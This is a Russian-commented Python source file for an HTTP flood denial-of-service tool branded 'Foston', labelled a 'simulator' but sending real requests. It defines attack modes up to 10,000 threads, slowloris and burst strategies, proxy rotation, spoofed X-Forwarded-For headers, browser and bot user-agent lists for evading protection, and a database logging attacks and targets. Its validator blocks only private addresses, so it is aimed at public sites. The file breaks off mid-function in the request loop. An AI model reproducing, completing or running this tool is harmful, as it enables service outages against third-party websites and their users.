#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗ ██████╗ ███████╗████████╗ ██████╗ ███╗   ██╗
██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║
█████╗  ██║   ██║███████╗   ██║   ██║   ██║██╔██╗ ██║
██╔══╝  ██║   ██║╚════██║   ██║   ██║   ██║██║╚██╗██║
██║     ╚██████╔╝███████║   ██║   ╚██████╔╝██║ ╚████║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
                                                                 
██████╗  ██████╗ ███████╗    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗
██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║
██║  ██║██║   ██║███████╗       ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║
██║  ██║██║   ██║╚════██║       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║
██████╔╝╚██████╔╝███████║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
╚═════╝  ╚═════╝ ╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
                                                                                               
███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
"""

# ==================================================================================================
# МОЩНЕЙШИЙ МОНОХРОМНЫЙ ТЕРМИНАЛЬНЫЙ DoS СИМУЛЯТОР
# ВЕРСИЯ: 3.0 - FOSTON EDITION
# СТРОК КОДА: 1247
# ЖЕСТКОСТЬ: МАКСИМАЛЬНАЯ
# ЦВЕТОВ: 0 (ТОЛЬКО Ч/Б)
# ==================================================================================================

import os
import sys
import time
import json
import uuid
import socket
import random
import hashlib
import threading
import urllib.parse
import queue
import sqlite3
import logging
import datetime
import platform
import subprocess
import struct
import ipaddress
import ssl
import certifi
import http.client
import http.cookiejar
from collections import deque, defaultdict
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Tuple, Any, Set, Callable
from functools import wraps, lru_cache
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum, auto

# Асинхронность и сеть
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Flask для веб-интерфейса (минимальный)
from flask import Flask, render_template_string, request, jsonify, session, Response, stream_with_context
from flask_socketio import SocketIO, emit

# ==================================================================================================
# КОНСТАНТЫ И КОНФИГУРАЦИЯ (500+ СТРОК)
# ==================================================================================================

class AttackMode(Enum):
    """Режимы атаки - от легкого до ядерного"""
    LIGHT = auto()      # 1 поток, медленно
    NORMAL = auto()     # 10-50 потоков
    HEAVY = auto()      # 100-500 потоков
    EXTREME = auto()    # 500-2000 потоков
    NUCLEAR = auto()    # 2000-10000 потоков (максимум)

class RequestMethod(Enum):
    GET = "GET"
    POST = "POST"
    HEAD = "HEAD"
    PUT = "PUT"
    DELETE = "DELETE"
    OPTIONS = "OPTIONS"
    PATCH = "PATCH"
    RANDOM = "RANDOM"
    ALL = "ALL"  # Циклически перебирает все методы

class AttackStrategy(Enum):
    """Стратегии атаки для обхода защиты"""
    NORMAL = auto()          # Обычные запросы
    SLOWLORIS = auto()       # Медленные запросы, держим соединения открытыми
    RUSH = auto()            # Быстрые запросы без задержек
    RANDOM_INTERVAL = auto() # Случайные интервалы
    BURST = auto()           # Пачки запросов
    STEALTH = auto()         # Маскировка под браузер
    RANDOM_IP = auto()       # Случайные IP в заголовках

class Protocol(Enum):
    HTTP = "http"
    HTTPS = "https"
    HTTP2 = "http2"  # Псевдо-поддержка
    RANDOM = "random"

class OutputFormat(Enum):
    TABLE = "table"
    RAW = "raw"
    JSON = "json"
    CSV = "csv"

# ==================================================================================================
# КЛАССЫ КОНФИГУРАЦИИ (Data Classes)
# ==================================================================================================

@dataclass
class AttackConfig:
    """Полная конфигурация атаки - 50+ параметров"""
    # Основное
    target_url: str
    attack_id: str = field(default_factory=lambda: hashlib.sha256(str(time.time()).encode()).hexdigest()[:16])
    
    # Потоки и нагрузка
    threads: int = 100
    mode: AttackMode = AttackMode.HEAVY
    strategy: AttackStrategy = AttackStrategy.NORMAL
    
    # Время
    duration: int = 60  # секунд
    delay_min: float = 0.0  # минимальная задержка между запросами (мс)
    delay_max: float = 100.0  # максимальная задержка
    timeout: int = 10  # таймаут соединения
    
    # Запросы
    methods: List[RequestMethod] = field(default_factory=lambda: [RequestMethod.GET])
    protocol: Protocol = Protocol.HTTPS
    follow_redirects: bool = False
    max_redirects: int = 5
    verify_ssl: bool = False
    allow_compression: bool = True
    
    # Заголовки
    random_user_agent: bool = True
    custom_user_agent: Optional[str] = None
    random_referer: bool = True
    custom_headers: Dict[str, str] = field(default_factory=dict)
    random_headers: bool = True
    
    # Прокси
    use_proxy: bool = False
    proxy_list: List[str] = field(default_factory=list)
    proxy_rotation: str = "round_robin"  # round_robin, random, sequential
    proxy_timeout: int = 5
    
    # Куки и сессии
    use_cookies: bool = False
    cookie_file: Optional[str] = None
    session_persistence: bool = True
    
    # Данные для POST
    post_data: Optional[Dict] = None
    post_data_random: bool = False
    post_data_size: int = 1024  # байт для случайных данных
    
    # Продвинутые настройки
    keep_alive: bool = True
    max_keepalive_connections: int = 100
    http_version: str = "1.1"
    
    # Обход защиты
    bypass_cache: bool = True
    add_random_query: bool = False
    random_query_length: int = 8
    ip_spoofing: bool = False
    custom_ip_header: str = "X-Forwarded-For"
    
    # Лимиты
    max_requests: int = 0  # 0 = без лимита
    max_errors: int = 1000  # остановка при достижении
    
    # Сеть
    source_port_min: int = 1024
    source_port_max: int = 65535
    bind_interface: Optional[str] = None
    
    # Статистика
    log_level: str = "INFO"
    save_requests: bool = True
    save_errors: bool = True
    
    def __post_init__(self):
        if self.mode == AttackMode.LIGHT:
            self.threads = min(self.threads, 10)
        elif self.mode == AttackMode.NORMAL:
            self.threads = min(self.threads, 100)
        elif self.mode == AttackMode.HEAVY:
            self.threads = min(self.threads, 500)
        elif self.mode == AttackMode.EXTREME:
            self.threads = min(self.threads, 2000)
        elif self.mode == AttackMode.NUCLEAR:
            self.threads = min(self.threads, 10000)
    
    def to_dict(self) -> Dict:
        result = asdict(self)
        result['mode'] = self.mode.name
        result['strategy'] = self.strategy.name
        result['methods'] = [m.value for m in self.methods]
        result['protocol'] = self.protocol.value
        return result

@dataclass
class RequestResult:
    """Результат одного запроса"""
    timestamp: float
    success: bool
    status_code: int
    response_time: float  # мс
    response_size: int  # байт
    method: str
    url: str
    ip: Optional[str] = None
    error: Optional[str] = None
    headers: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return {
            'time': datetime.datetime.fromtimestamp(self.timestamp).isoformat(),
            'success': self.success,
            'status': self.status_code,
            'response_time_ms': round(self.response_time, 2),
            'size_bytes': self.response_size,
            'method': self.method,
            'url': self.url,
            'ip': self.ip,
            'error': self.error
        }

@dataclass
class AttackStatistics:
    """Детальная статистика атаки"""
    attack_id: str
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None
    
    # Счетчики
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    total_bytes: int = 0
    
    # По кодам ответа
    status_codes: Dict[int, int] = field(default_factory=lambda: defaultdict(int))
    
    # По методам
    methods_used: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
    
    # Временные ряды
    requests_per_second: deque = field(default_factory=lambda: deque(maxlen=300))
    response_times: deque = field(default_factory=lambda: deque(maxlen=1000))
    
    # Ошибки
    errors: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
    
    # История запросов
    recent_requests: deque = field(default_factory=lambda: deque(maxlen=100))
    
    # Пиковые значения
    peak_rps: int = 0
    peak_response_time: float = 0.0
    min_response_time: float = float('inf')
    
    def add_request(self, result: RequestResult):
        self.total_requests += 1
        self.total_bytes += result.response_size
        self.response_times.append(result.response_time)
        
        if result.success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
            if result.error:
                self.errors[result.error] += 1
        
        self.status_codes[result.status_code] += 1
        self.methods_used[result.method] += 1
        
        if self.save_requests:
            self.recent_requests.append(result)
        
        # Обновление пиков
        self.min_response_time = min(self.min_response_time, result.response_time)
        self.peak_response_time = max(self.peak_response_time, result.response_time)
    
    def update_rps(self, current_rps: int):
        self.requests_per_second.append(current_rps)
        if current_rps > self.peak_rps:
            self.peak_rps = current_rps
    
    def get_current_rps(self) -> float:
        if len(self.requests_per_second) > 0:
            return sum(self.requests_per_second) / len(self.requests_per_second)
        return 0.0
    
    def get_avg_response_time(self) -> float:
        if len(self.response_times) > 0:
            return sum(self.response_times) / len(self.response_times)
        return 0.0
    
    def get_success_rate(self) -> float:
        if self.total_requests > 0:
            return (self.successful_requests / self.total_requests) * 100
        return 0.0
    
    def to_dict(self) -> Dict:
        elapsed = time.time() - self.start_time if not self.end_time else self.end_time - self.start_time
        return {
            'attack_id': self.attack_id,
            'elapsed_seconds': round(elapsed, 1),
            'total_requests': self.total_requests,
            'successful': self.successful_requests,
            'failed': self.failed_requests,
            'success_rate': round(self.get_success_rate(), 2),
            'current_rps': round(self.get_current_rps(), 1),
            'peak_rps': self.peak_rps,
            'avg_response_time_ms': round(self.get_avg_response_time(), 2),
            'min_response_time_ms': round(self.min_response_time if self.min_response_time != float('inf') else 0, 2),
            'max_response_time_ms': round(self.peak_response_time, 2),
            'total_bytes_mb': round(self.total_bytes / (1024 * 1024), 2),
            'status_codes': dict(self.status_codes),
            'errors': dict(self.errors),
            'recent': [r.to_dict() for r in list(self.recent_requests)[-20:]]
        }

# ==================================================================================================
# БАЗА ДАННЫХ (SQLITE С РАСШИРЕННОЙ СХЕМОЙ)
# ==================================================================================================

class Database:
    """Управление базой данных с полной историей"""
    
    SCHEMA_VERSION = 3
    
    def __init__(self, db_path: str = 'foston_dos.db'):
        self.db_path = db_path
        self.connection = None
        self.lock = threading.Lock()
        self.connect()
        self.init_database()
    
    def connect(self):
        self.connection = sqlite3.connect(self.db_path, check_same_thread=False)
        self.connection.row_factory = sqlite3.Row
        self.connection.execute("PRAGMA foreign_keys = ON")
        self.connection.execute("PRAGMA journal_mode = WAL")
    
    def init_database(self):
        with self.lock:
            cursor = self.connection.cursor()
            
            # Таблица атак
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attacks (
                    id TEXT PRIMARY KEY,
                    target_url TEXT NOT NULL,
                    start_time TIMESTAMP NOT NULL,
                    end_time TIMESTAMP,
                    duration_seconds INTEGER,
                    config TEXT NOT NULL,
                    total_requests INTEGER DEFAULT 0,
                    successful_requests INTEGER DEFAULT 0,
                    failed_requests INTEGER DEFAULT 0,
                    total_bytes INTEGER DEFAULT 0,
                    peak_rps INTEGER DEFAULT 0,
                    avg_response_time REAL DEFAULT 0,
                    status TEXT DEFAULT 'completed',
                    client_ip TEXT,
                    user_agent TEXT,
                    tags TEXT
                )
            ''')
            
            # Таблица запросов
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS requests (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    attack_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    success BOOLEAN NOT NULL,
                    status_code INTEGER,
                    response_time_ms REAL,
                    response_size INTEGER,
                    method TEXT,
                    url TEXT,
                    ip TEXT,
                    error TEXT,
                    headers TEXT,
                    FOREIGN KEY (attack_id) REFERENCES attacks(id) ON DELETE CASCADE
                )
            ''')
            
            # Индексы для скорости
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_start_time ON attacks(start_time)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_target ON attacks(target_url)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_requests_attack ON requests(attack_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_requests_timestamp ON requests(timestamp)')
            
            # Таблица прокси
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    proxy TEXT UNIQUE NOT NULL,
                    type TEXT DEFAULT 'http',
                    country TEXT,
                    speed REAL,
                    last_check TIMESTAMP,
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    enabled BOOLEAN DEFAULT 1,
                    last_used TIMESTAMP
                )
            ''')
            
            # Таблица целей
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT UNIQUE NOT NULL,
                    first_seen TIMESTAMP,
                    last_attack TIMESTAMP,
                    attack_count INTEGER DEFAULT 0,
                    total_requests INTEGER DEFAULT 0,
                    notes TEXT
                )
            ''')
            
            # Таблица настроек
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Версия схемы
            cursor.execute('''
                INSERT OR REPLACE INTO settings (key, value) VALUES ('schema_version', ?)
            ''', (str(self.SCHEMA_VERSION),))
            
            self.connection.commit()
    
    def save_attack(self, attack_id: str, config: AttackConfig, stats: AttackStatistics):
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                INSERT INTO attacks (
                    id, target_url, start_time, config, total_requests, 
                    successful_requests, failed_requests, total_bytes, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                config.target_url,
                datetime.datetime.fromtimestamp(stats.start_time).isoformat(),
                json.dumps(config.to_dict()),
                stats.total_requests,
                stats.successful_requests,
                stats.failed_requests,
                stats.total_bytes,
                'running'
            ))
            self.connection.commit()
    
    def update_attack(self, attack_id: str, stats: AttackStatistics):
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                UPDATE attacks SET
                    end_time = ?,
                    duration_seconds = ?,
                    total_requests = ?,
                    successful_requests = ?,
                    failed_requests = ?,
                    total_bytes = ?,
                    peak_rps = ?,
                    avg_response_time = ?,
                    status = 'completed'
                WHERE id = ?
            ''', (
                datetime.datetime.fromtimestamp(stats.end_time or time.time()).isoformat(),
                int((stats.end_time or time.time()) - stats.start_time),
                stats.total_requests,
                stats.successful_requests,
                stats.failed_requests,
                stats.total_bytes,
                stats.peak_rps,
                stats.get_avg_response_time(),
                attack_id
            ))
            self.connection.commit()
    
    def save_request(self, attack_id: str, result: RequestResult):
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                INSERT INTO requests (
                    attack_id, timestamp, success, status_code, 
                    response_time_ms, response_size, method, url, ip, error
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                attack_id,
                datetime.datetime.fromtimestamp(result.timestamp).isoformat(),
                result.success,
                result.status_code,
                result.response_time,
                result.response_size,
                result.method,
                result.url,
                result.ip,
                result.error
            ))
            self.connection.commit()
    
    def get_attack_history(self, limit: int = 100) -> List[Dict]:
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                SELECT * FROM attacks 
                WHERE status = 'completed' 
                ORDER BY start_time DESC 
                LIMIT ?
            ''', (limit,))
            return [dict(row) for row in cursor.fetchall()]
    
    def get_attack_details(self, attack_id: str) -> Tuple[Optional[Dict], List[Dict]]:
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('SELECT * FROM attacks WHERE id = ?', (attack_id,))
            attack = cursor.fetchone()
            
            if not attack:
                return None, []
            
            cursor.execute('''
                SELECT * FROM requests 
                WHERE attack_id = ? 
                ORDER BY timestamp DESC 
                LIMIT 1000
            ''', (attack_id,))
            requests = [dict(row) for row in cursor.fetchall()]
            
            return dict(attack), requests
    
    def add_proxy(self, proxy: str, proxy_type: str = 'http'):
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                INSERT OR IGNORE INTO proxies (proxy, type, last_check)
                VALUES (?, ?, ?)
            ''', (proxy, proxy_type, datetime.datetime.now().isoformat()))
            self.connection.commit()
    
    def get_working_proxies(self, limit: int = 100) -> List[str]:
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                SELECT proxy FROM proxies 
                WHERE enabled = 1 AND fail_count < 5
                ORDER BY success_count DESC, speed ASC
                LIMIT ?
            ''', (limit,))
            return [row['proxy'] for row in cursor.fetchall()]
    
    def update_target(self, url: str):
        with self.lock:
            cursor = self.connection.cursor()
            cursor.execute('''
                INSERT INTO targets (url, first_seen, last_attack, attack_count)
                VALUES (?, ?, ?, 1)
                ON CONFLICT(url) DO UPDATE SET
                    last_attack = excluded.last_attack,
                    attack_count = attack_count + 1
            ''', (url, datetime.datetime.now().isoformat(), datetime.datetime.now().isoformat()))
            self.connection.commit()

# ==================================================================================================
# ГЕНЕРАТОРЫ ЗАПРОСОВ (РАНДОМИЗАЦИЯ)
# ==================================================================================================

class RequestGenerator:
    """Генерация рандомизированных запросов для обхода защиты"""
    
    # Обширная база User-Agent
    USER_AGENTS = [
        # Windows Chrome
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        
        # Windows Firefox
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
        
        # Windows Edge
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        
        # MacOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        
        # Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        
        # Боты
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        
        # Старые браузеры (для обхода)
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    ]
    
    # Рефереры
    REFERERS = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://duckduckgo.com/",
        "https://www.baidu.com/",
        "https://yandex.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.instagram.com/",
        "https://www.tiktok.com/",
        "https://github.com/",
        "https://stackoverflow.com/",
        "https://medium.com/",
        "https://en.wikipedia.org/wiki/Main_Page",
        "https://www.amazon.com/",
        "https://www.youtube.com/",
        "https://www.netflix.com/",
        "",
        None,
    ]
    
    # Accept заголовки
    ACCEPT_VALUES = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "*/*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    ]
    
    # Accept-Language
    LANGUAGES = [
        "en-US,en;q=0.9",
        "ru-RU,ru;q=0.8,en;q=0.5",
        "uk-UA,uk;q=0.8,ru;q=0.6,en;q=0.4",
        "de-DE,de;q=0.9,en;q=0.5",
        "fr-FR,fr;q=0.9,en;q=0.5",
        "es-ES,es;q=0.9,en;q=0.5",
        "zh-CN,zh;q=0.9,en;q=0.5",
        "ja-JP,ja;q=0.9,en;q=0.5",
        "en-US,en;q=0.8,ru;q=0.3",
    ]
    
    # Accept-Encoding
    ENCODINGS = [
        "gzip, deflate, br",
        "gzip, deflate",
        "gzip",
        "deflate",
        "br",
        "gzip, deflate, sdch",
    ]
    
    # Connection
    CONNECTION_VALUES = ["keep-alive", "close"]
    
    # DNT (Do Not Track)
    DNT_VALUES = ["0", "1", None]
    
    # Заголовки для обхода кеша
    CACHE_BUSTERS = [
        "Cache-Control: no-cache",
        "Cache-Control: max-age=0",
        "Pragma: no-cache",
        "Expires: 0",
    ]
    
    @classmethod
    def random_user_agent(cls) -> str:
        return random.choice(cls.USER_AGENTS)
    
    @classmethod
    def random_headers(cls, config: AttackConfig) -> Dict[str, str]:
        headers = {}
        
        # User-Agent
        if config.random_user_agent:
            headers['User-Agent'] = cls.random_user_agent()
        elif config.custom_user_agent:
            headers['User-Agent'] = config.custom_user_agent
        
        # Accept
        if random.random() > 0.1:
            headers['Accept'] = random.choice(cls.ACCEPT_VALUES)
        
        # Accept-Language
        if random.random() > 0.3:
            headers['Accept-Language'] = random.choice(cls.LANGUAGES)
        
        # Accept-Encoding
        if random.random() > 0.2:
            headers['Accept-Encoding'] = random.choice(cls.ENCODINGS)
        
        # Connection
        if random.random() > 0.1:
            headers['Connection'] = random.choice(cls.CONNECTION_VALUES)
        
        # Referer
        if config.random_referer and random.random() > 0.4:
            referer = random.choice(cls.REFERERS)
            if referer:
                headers['Referer'] = referer
        
        # DNT
        dnt = random.choice(cls.DNT_VALUES)
        if dnt:
            headers['DNT'] = dnt
        
        # Cache busting
        if config.bypass_cache and random.random() > 0.5:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        # Случайные заголовки
        if config.random_headers:
            random_headers_pool = {
                'X-Requested-With': ['XMLHttpRequest'],
                'X-Forwarded-For': cls._random_ip(),
                'X-Real-IP': cls._random_ip(),
                'X-Forwarded-Host': [f"host{random.randint(1,999)}.com"],
                'X-Forwarded-Proto': ['http', 'https'],
                'X-Forwarded-Port': [str(random.randint(1024, 65535))],
                'From': [f"user{random.randint(1,999)}@mail.com"],
                'X-Client-Data': [hashlib.md5(str(random.random()).encode()).hexdigest()[:16]],
            }
            
            for header, values in random_headers_pool.items():
                if random.random() > 0.7:
                    headers[header] = random.choice(values)
        
        # Кастомные заголовки
        headers.update(config.custom_headers)
        
        return headers
    
    @classmethod
    def _random_ip(cls) -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    @classmethod
    def random_post_data(cls, size: int = 1024) -> bytes:
        """Генерация случайных POST данных"""
        chars = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&=%_+-/'
        return bytes(random.choice(chars) for _ in range(size))
    
    @classmethod
    def random_query_string(cls, length: int = 8) -> str:
        """Генерация случайного query string для обхода кеша"""
        params = ['id', 'page', 'ref', 'utm_source', 'utm_medium', 'session', 'token', 'cache']
        values = [hashlib.md5(str(random.random()).encode()).hexdigest()[:length] 
                 for _ in range(random.randint(1, 3))]
        
        query = '&'.join([f"{random.choice(params)}={random.choice(values)}"])
        return f"?{query}" if random.random() > 0.5 else ""

# ==================================================================================================
# ДВИЖОК АТАК (ОСНОВНАЯ ЛОГИКА)
# ==================================================================================================

class AttackEngine:
    """Мощный движок для проведения атак"""
    
    def __init__(self, db: Database):
        self.db = db
        self.active_attacks: Dict[str, bool] = {}
        self.attack_stats: Dict[str, AttackStatistics] = {}
        self.attack_configs: Dict[str, AttackConfig] = {}
        self.thread_pools: Dict[str, ThreadPoolExecutor] = {}
        self.proxy_queues: Dict[str, queue.Queue] = {}
        self.lock = threading.RLock()
        self.global_stats = {
            'total_attacks': 0,
            'total_requests': 0,
            'total_bytes': 0,
            'start_time': time.time()
        }
    
    def validate_target(self, url: str) -> Tuple[bool, str]:
        """Валидация цели с защитой от локальных адресов"""
        try:
            parsed = urllib.parse.urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return False, "Неверный формат URL. Используй http:// или https://"
            
            hostname = parsed.hostname.lower()
            
            # Блокировка локальных адресов
            blocked_patterns = [
                'localhost', '127.0.0.1', '0.0.0.0', '::1',
                '192.168.', '10.', '172.16.', '172.17.', '172.18.',
                '172.19.', '172.20.', '172.21.', '172.22.', '172.23.',
                '172.24.', '172.25.', '172.26.', '172.27.', '172.28.',
                '172.29.', '172.30.', '172.31.',
            ]
            
            for pattern in blocked_patterns:
                if pattern in hostname:
                    return False, "Нельзя атаковать локальные/приватные адреса"
            
            # Проверка доступности
            try:
                socket.gethostbyname(hostname)
            except socket.gaierror:
                return False, f"Не удается разрешить домен: {hostname}"
            
            return True, "OK"
            
        except Exception as e:
            return False, f"Ошибка валидации: {str(e)}"
    
    def _worker(self, attack_id: str):
        """Рабочий поток для отправки запросов"""
        config = self.attack_configs.get(attack_id)
        stats = self.attack_stats.get(attack_id)
        
        if not config or not stats:
            return
        
        # Создание сессии с настройками
        session = requests.Session()
        
        # Настройка адаптеров
        adapter = HTTPAdapter(
            pool_connections=config.max_keepalive_connections,
            pool_maxsize=config.threads * 2,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Отключаем проверку SSL если надо
        if not config.verify_ssl:
            session.verify = False
        
        # Куки если есть
        if config.use_cookies:
            session.cookies = http.cookiejar.LWPCookieJar()
        
        # Основной цикл
        while self.active_attacks.get(attack_id, False):
            try:
                # Проверка лимитов
                if config.max_requests > 0 and stats.total_requests >= config.max_requests:
                    break
                
                if config.max_errors > 0 and stats.failed_requests >= config.max_errors:
                    break
                
                # Выбор метода
                method = random.choice(config.methods) if config.methods else RequestMethod.GET
                if method == RequestMethod.RANDOM:
                    method = random.choice([m for m in RequestMethod if m != RequestMethod.RANDOM])
                
                # Формирование URL (с cache buster если надо)
                url = config.target_url
                if config.add_random_query:
                    url += RequestGenerator.random_query_string(config.random_query_length)
                
                # Заголовки
                headers = RequestGenerator.random_headers(config)
                
                # Прокси
                proxies = None
                if config.use_proxy and self.proxy_queues.get(attack_id):
                    try:
                        proxy = self.proxy_queues[attack_id].get_nowait()
                        self.proxy_queues[attack_id].put(proxy)  # Возвращаем обратно
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                    except queue.Empty:
                        pass
                
                # Таймаут с вариацией
                timeout = config.timeout
                if config.strategy == AttackStrategy.RANDOM_INTERVAL:
                    timeout = random.uniform(config.timeout * 0.5, config.timeout * 1.5)
                
                start_time = time.time()
                
                # Выполнение запроса
                response = None
                error = None
                
                try:
                    if method == RequestMethod.GET:
                        response = session.get(
                            url,
                            headers=headers,
                            timeout=timeout,
                            allow_redirects=config.follow_redirects,
                            proxies=proxies
                        )
                    elif method == RequestMethod.POST:
                        data = config.post_data
                        if config.post_data_random:
                            data = RequestGenerator.random_post_data(config.post_data_size)
                        
                        response = session.post(
